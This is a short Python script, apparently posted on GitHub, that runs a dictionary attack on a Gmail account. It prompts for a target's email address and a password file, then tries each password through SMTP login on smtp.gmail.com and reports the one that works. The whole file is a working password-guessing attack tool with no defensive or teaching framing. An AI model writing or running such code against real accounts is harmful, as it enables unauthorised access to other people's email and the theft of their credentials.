import smtplib 
from termcolor import colored 

#Made by Ksaur12 (at github)
try:
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo() 
	smtpserver.starttls()
	
	usr = input("[*] Enter target's email address: ") 
	try:
		pwdfile = input("[*] Enter name of the password file: ") 
		file = open(pwdfile, 'r')
	except:
		print('\nPassword file not found')
		print('Exiting program......')
		exit()
	
	for pwd in file:
		pwd = pwd.strip('\n')
		try:
			smtpserver.login(usr, pwd)
			print(colored("[*] Password found: " + pwd, 'green'))
			break 
	
		except smtplib.SMTPAuthenticationError:
			print(colored('[*] Wrong password: ' + pwd, 'red'))
except:
	print('Error in network or something')
